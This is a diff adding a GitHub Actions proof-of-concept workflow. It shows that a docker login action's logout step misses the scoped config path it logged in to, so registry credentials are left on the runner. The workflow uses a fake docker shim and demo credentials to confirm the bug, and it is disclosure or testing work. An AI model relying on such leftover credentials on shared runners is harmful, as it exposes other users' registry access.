@@ -1,0 +1,73 @@
+name: poc-default-registry-cleanup-bypass
+on:
+  workflow_dispatch:
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install fake docker
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p "$RUNNER_TEMP/bin"
+          cat > "$RUNNER_TEMP/bin/docker" <<'EOF'
+          #!/usr/bin/env bash
+          set -euo pipefail
+          cmd="$1"; shift || true
+          echo "cmd=$cmd DOCKER_CONFIG=${DOCKER_CONFIG:-} args=$*" >> "$RUNNER_TEMP/docker.log"
+          if [ "$cmd" = "login" ]; then
+            cat >/dev/null || true
+            mkdir -p "${DOCKER_CONFIG}"
+            echo '{"auths":{"demo":{"auth":"ZGVtbzpkZW1v"}}}' > "${DOCKER_CONFIG}/config.json"
+            exit 0
+          fi
+          if [ "$cmd" = "logout" ]; then
+            rm -f "${DOCKER_CONFIG}/config.json" || true
+            exit 0
+          fi
+          exit 0
+          EOF
+          chmod +x "$RUNNER_TEMP/bin/docker"
+          echo "$RUNNER_TEMP/bin" >> "$GITHUB_PATH"
+
+      - name: Main run (no registry input, scope set)
+        shell: bash
+        env:
+          INPUT_USERNAME: demo
+          INPUT_PASSWORD: demo
+          INPUT_SCOPE: myscope
+          INPUT_LOGOUT: "true"
+        run: |
+          set -euo pipefail
+          node dist/index.js | tee "$RUNNER_TEMP/main.log"
+          sed -n 's/^::save-state name=registries:://p' "$RUNNER_TEMP/main.log" > "$RUNNER_TEMP/state_registries.json"
+          {
+            echo "STATE_REGISTRIES<<EOF"
+            cat "$RUNNER_TEMP/state_registries.json"
+            echo "EOF"
+          } >> "$GITHUB_ENV"
+
+      - name: Simulate post run
+        shell: bash
+        env:
+          STATE_isPost: "true"
+          STATE_logout: "true"
+          STATE_registries: ${{ env.STATE_REGISTRIES }}
+        run: |
+          set -euo pipefail
+          node dist/index.js | tee "$RUNNER_TEMP/post.log"
+
+      - name: Validate exploit
+        shell: bash
+        run: |
+          set -euo pipefail
+          cat "$RUNNER_TEMP/docker.log"
+
+          grep -q "cmd=login DOCKER_CONFIG=$HOME/.docker/buildx/config/registry-1.docker.io/myscope" "$RUNNER_TEMP/docker.log"
+          grep -q "cmd=logout DOCKER_CONFIG=$HOME/.docker/buildx/config/myscope" "$RUNNER_TEMP/docker.log"
+
+          test -f "$HOME/.docker/buildx/config/registry-1.docker.io/myscope/config.json"
+          echo "EXPLOIT CONFIRMED: logout missed the real login config path"
